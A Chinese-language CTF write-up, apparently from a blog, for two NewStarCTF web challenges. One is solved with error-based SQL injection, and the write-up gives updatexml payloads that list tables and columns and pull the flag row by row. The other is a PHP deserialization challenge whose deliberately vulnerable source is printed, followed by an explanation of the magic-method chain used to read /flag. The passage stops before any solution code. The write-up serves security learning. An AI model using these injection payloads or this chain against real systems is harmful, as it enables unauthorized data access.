Word-For-You(2 Gen)

一个SQL的报错注入，特别常规。但是有一个比较坑的点是一直查询到第十二个记录才可以拿到flag，因为我是用limit语句一行一行查询的。

这一题考点是报错注入。

1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#

编辑

根据上一周的信息我们先查comments表。

1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='wfy_comments'),0x7e),1)#

编辑

group_concat会显示不出数据来，因为太多了。由于本人懒得敲代码，硬生生改了11次终于到 limit 11，发现了flag。出题人太坏了。。

1'  and updatexml(1,concat(0x7e,(select (text) from wfy_comments limit 11 ,1),0x7e),1)#

UnserializeOne

php的反序列化，就是繁琐了一些。利用上了各种各样的魔术方法，是一个熟悉php魔术方法的好题目。并且从出题人处得到了一篇学习php反序列化的特别棒的文章。

<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}

一道反序列化题，阅读代码可以很明显地发现是要调用__invoke()读取flag。我们来分析一下如何构造我们的反序列化链吧。

从上图可以知道，为了调用__invoke，我们只能依赖于代码中的(如下图所示)，其中$this->func是Sec类对象。

而为了调用上图的__isset（详情如下图1），我们必须调用下图2

上图中的$this->obj是一个Start类对象，cmd是该类对象的一个不存在的属性即可。

现在的问题是如何调用__clone方法了

阅读完题目代码就不难发现，此处需要调用下图的__call方法，其中$var[0]和$this->cla是一个eeee类对象。

继续接着看如何调用__call方法

惊喜地发现Sec类中的check函数可以满足我们的要求，我们只要让下图的$this->obj为一个Easy类对象即可，并且$this->var是一个数组，其中$this->var[0]是一个eee类对象编辑

剩余的步骤就简单了，触发__toString只需要来个echo就行！刚好Start的__destruct方法可以满足，而且该方法在反序列化结束后会自动调用，所以我们让下图的$this->name为一个Sec类对象即可。

好的，经过以上分析，让我们着手开始编写解题代码。由于我对反序列化理解也不是很深，所以构造反序列化链特别丑陋，仅供读者参考。
